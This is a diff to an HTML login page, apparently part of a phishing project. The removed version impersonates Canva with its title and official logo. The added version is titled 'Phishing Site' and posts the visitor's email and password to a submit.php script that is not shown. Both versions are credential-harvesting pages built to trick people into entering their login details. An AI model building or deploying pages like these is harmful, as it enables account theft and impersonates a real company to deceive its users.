@@ -3,26 +3,25 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login to Canva</title>
-    <link rel="stylesheet" href="style.css">
+    <title>Phishing Site</title>
+    <!-- Link to the CSS file -->
+    <link rel="stylesheet" href="styles.css">
 </head>
 <body>
-    <div class="login-container">
-        <img src="https://static.canva.com/designsuite/assets/images/canva-logo.svg" alt="Canva Logo">
-        <form id="loginForm">
-            <div class="form-group">
-                <label for="email">Email Address</label>
-                <input type="email" id="email" name="email" placeholder="Enter email address" required>
-            </div>
-            <div class="form-group">
-                <label for="password">Password</label>
-                <input type="password" id="password" name="password" placeholder="Enter password" required>
-            </div>
-            <button type="submit">Log In</button>
+    <div class="container">
+        <h2>Login</h2>
+        <form action="submit.php" method="POST">
+            <label for="email">Email:</label>
+            <input type="email" id="email" name="email" required><br><br>
+            
+            <label for="password">Password:</label>
+            <input type="password" id="password" name="password" required><br><br>
+            
+            <button type="submit">Login</button>
         </form>
     </div>
-
-    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
-    <script src="script.js"></script>
+    
+    <!-- Link to the JavaScript file -->
+    <script src="scripts.js"></script>
 </body>
 </html>
